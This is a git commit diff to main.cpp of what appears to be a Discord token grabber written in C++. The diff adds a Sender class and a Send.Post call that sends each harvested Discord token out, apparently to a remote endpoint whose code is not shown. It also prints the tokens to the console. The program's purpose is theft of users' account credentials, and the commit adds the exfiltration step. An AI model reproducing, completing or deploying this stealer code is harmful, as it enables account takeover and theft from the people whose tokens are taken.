74d5705d946ce0961fe907e4113be5371bb7c1e5
R00T <82186529+0MrRoot0@users.noreply.github.com>
2022-08-25 10:21:32 +0300

    Updaitng main.cpp to Call Post Function

--- main.cpp
+++ main.cpp
@@ -1,14 +1,21 @@
 #include "discord.hpp"
 #include <iostream>
+#include "sender.h"
 int main( ) {
+	Sender Send;
 	Discord Discord;
 	clock_t begin = clock();
 	std::vector<std::string> Tokens = Discord.Grab();
 	switch (Discord.IsFoundToken) {
 	case true:
+		
 		for (int index = 0; index < Tokens.size(); index++) {
+			Send.Post(Tokens[index]);
 			std::cout << "Tokens -> " << Tokens[index] << std::endl;
+	
+				
 		}
+
 		break;
 	case false:
 		std::cout << "Couldn't Find any tokens" << std::endl;
